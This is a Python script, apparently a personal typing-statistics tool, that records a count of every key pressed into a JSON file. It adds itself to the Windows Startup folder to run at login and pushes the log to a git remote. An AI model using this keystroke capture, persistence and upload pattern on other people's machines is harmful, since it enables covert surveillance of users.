import json
import os
import subprocess
import sys
import ctypes
from pynput.keyboard import Key, Listener
from pynput import keyboard, mouse

log_file = 'stats.json'
max_buffer_size = 10



def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(e)
        return False

class Autostart:
    def __init__(self, repo_path):
        self.repo_path = repo_path

    def push_git(self):
        os.system(f'git -C {self.repo_path} add {log_file}')
        os.system(f'git -C {self.repo_path} commit -m "Update {log_file}"')
        os.system(f'git -C {self.repo_path} push')


    def create_autostart_script(self, repo_path, script_name='start_keylogger.bat'):
        # Determine the path to the autostart folder
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        # Path to the autostart script
        autostart_script_path = os.path.join(startup_folder, script_name)

        # Check if a file with the same name already exists and create a new name if necessary
        base_name, extension = os.path.splitext(script_name)
        counter = 1
        while os.path.exists(autostart_script_path):
            autostart_script_path = os.path.join(startup_folder, f"{base_name}_{counter}{extension}")
            counter += 1

        # Content of the autostart script
        autostart_script_content = f"""@echo off
cd {repo_path}
python keylogger.py
"""

        # Write the autostart script to the autostart folder
        with open(autostart_script_path, 'w') as f:
            f.write(autostart_script_content)

        print(f"Autostart script created at: {autostart_script_path}")


class Buffer:
    def __init__(self, max_size, file_path):
        self.max_size = max_size
        self.file_path = file_path
        self.buffer = {}

    def add(self, key):
        key = str(key)
        if key in self.buffer:
            self.buffer[key] += 1
        else:
            self.buffer[key] = 1

        print("Buffer: ", self.buffer)

        if len(self.buffer) >= self.max_size:
            self.flush()


    def flush(self):
        if not self.buffer:
            return
    
        # Check if the file exists
        if os.path.exists(self.file_path):
            with open(self.file_path, 'r') as f:
                try:
                    existing_data = json.load(f)  # Load existing data from the file
                except json.JSONDecodeError:
                    existing_data = []  # If the file is empty or invalid, start with an empty list
        else:
            existing_data = []  # If the file does not exist, start with an empty list
    
        # Update the existing data with the buffer's contents
        for key, value in self.buffer.items():
            # Check if the key already exists in the list
            found = False
            for item in existing_data:
                if item['key'] == key:
                    item['value'] += value  # Add new keystrokes to the existing value
                    found = True
                    break
            if not found:
                existing_data.append({'key': key, 'value': value})  # Add new key-value pair as an object in the list
    
        # Write the updated data back to the file
        with open(self.file_path, 'w') as f:
            json.dump(existing_data, f, indent=4)
    
        # Clear the buffer after flushing
        self.buffer.clear()



if __name__ == '__main__':


    ##get arugments from command line
    print('Number of arguments:', len(sys.argv), 'arguments.')
    print('Argument List:', str(sys.argv))

    if len(sys.argv) > 1 and '-init' in sys.argv:

        print('Initializing keylogger')
        # Path to your repository
        repo_path = os.path.abspath(os.path.dirname(__file__))
        # Create the autostart script
        autostart = Autostart(repo_path)


        autostart.create_autostart_script(repo_path)

    elif len(sys.argv) > 1 and '-push' in sys.argv:
        print('Pushing keylogger')
        repo_path = os.path.abspath(os.path.dirname(__file__))
        autostart = Autostart(repo_path)
        autostart.push_git()

    
    else:
        print('Starting keylogger')

        buffer = Buffer(max_size=max_buffer_size, file_path=log_file)


        def on_release(key):
            try:
                pass
            except KeyError:
                pass

        def on_key_press(key):
            print("Key pressed: ", key)
            buffer.add(key)

        with Listener(on_press=on_key_press, on_release=on_release) as listener:
            listener.join()
